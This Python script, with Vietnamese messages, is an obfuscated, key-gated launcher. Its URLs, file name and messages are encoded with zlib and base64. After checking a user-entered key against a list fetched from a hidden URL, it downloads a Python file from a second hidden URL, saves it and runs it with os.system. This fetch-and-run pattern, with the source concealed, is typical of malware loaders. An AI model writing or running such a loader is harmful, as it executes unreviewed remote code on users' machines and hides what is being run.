E=exit
C=print
import zlib as A,base64 as B,os,requests as D
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJzjUgACXQWP0EhXP4UQD39HTwUPIA5xdAaKZpSUFBRb6etnlFam5pVk5CdmZiRmliQm6yVl5uvlZOZlc3EBACjSExg='))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJxTUFBQ0FVwd/R1VTgy4dj6h7sXOSsEeBxuDFEICfJ8uLvJT8Hp4e55nkCxUGcnR6dIoGLfUEeFYP/QIGdXBR/Pw11+Ch4Pd7cpRDn6+CsAlQLF/LwVnEDiLiDzZnkqcHEBAI0mJhI='))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJwBNADL/yAgICAtIEtFWSBT4busIEThu6RORyBIVVnhu4BOIFRIT+G6oEkgSOG6okkgVOG6tkMgCgoINBTk'))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJxTUFBQ0FXwyczLVvAtTVTwTq1UUFMIyTi8JS9dISQzTyHs4e5GBffE3FQFKy4uADUvDjw='))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJxTUACBjJKSgmIrff2M0srUvJKM/MTMjMTMksRkvaTMfL2czLxsLi4AD48NjA=='))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJxTUFBQ0FVwerhrcZ6C88NdawsU/DKAVImC+8Ndy/PAnKUlClYKhub6hkb6RgZGJgpcXABHHROp'))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJxTUFBQ0FXwONwcqRDi4eir4O7pqODkH6EQ5ejjr3BkwsPdTQp+Hg93rfEDco6tf7h7kTNQ3eEpfu4KIZ5+Ck4Pdy3yU3AGygdAlIUouD/ctcwPzFkSAqQOdypwcQEAohoo9g=='))
I=(lambda s:A.decompress(B.b64decode(s)).decode())('eJzLKCkpKLbS108syNRNyi/Ry8/LycxLBXH1y4z1s1Mri/VKKkoADVMN5Q==')
try:J=D.get(I);H=J.text
except D.RequestException as F:C(f"Không thể tải key. Lỗi: {F}");E(1)
if not H:C((lambda s:A.decompress(B.b64decode(s)).decode())('eJzzzji8JS9doSTj4e5mhZKHuxZnKmSnVuopeGcCBXIVSooSFXIe7lqYqXBk4rEND3fPBapNebhrdZ5CRv7DXduTFbIf7tpfopD3cPfETIVcoMK8dD0AvToqCw=='));E(1)
K=input((lambda s:A.decompress(B.b64decode(s)).decode())('eJzzy3i4a22BQnZqpcKRiQ93NyuUZD7ctb9AoeTh7qXJCsmHF2SCxHdtL7FSAADsLBZP'))
if K not in H:C((lambda s:A.decompress(B.b64decode(s)).decode())('eJzj8k6tVMjOOLwlL13hyMTDu/LSdRTKSjMVcg5vAorkZB5elaeQ8XB3u0JiSm5mnkJuaaJCdmqlHgCYhxdO'));E(1)
L=(lambda s:A.decompress(B.b64decode(s)).decode())('eJzLKCkpKLbS108syNRNyi/Ry8/LycxLBXH1y4z1i0rz9AoqAfH2DQc=')
G=(lambda s:A.decompress(B.b64decode(s)).decode())('eJwrKs3TK6gEAAiWAm0=')
if not os.path.isfile(G):
	C((lambda s:A.decompress(B.b64decode(s)).decode())('eJw7MiExL12h5OGuxZkKaZk5qQp6enoAY2AIMA=='))
	try:
		M=D.get(L)
		with open(G,(lambda s:A.decompress(B.b64decode(s)).decode())('eJwrTwIAAVIA2g=='))as N:N.write(M.content)
		C((lambda s:A.decompress(B.b64decode(s)).decode())('eJwLebhrcaZCWmZOqkJJxuEFeRkKyYe35KUrAgCNOwrh'))
	except D.RequestException as F:C(f"Tải file thất bại! Lỗi: {F}");E(1)
else:C((lambda s:A.decompress(B.b64decode(s)).decode())('eJxzy8xJVTgy8fBihZKHuyfnAcldCzN1FLIzDm/JS1dIfrhrOVhscaZCDkhGDwBCPRf+'))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJzzTq1UODLx8K68dEWFIxMS89IVkjMe7lpYqZCWmZOqp6cHAO5+DaY='))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJw7MiExL13BO+Ph7vmZCkcmPNw9E8gNTi0qSy3SAwDKcw1F'))
os.system(f"python {G}")
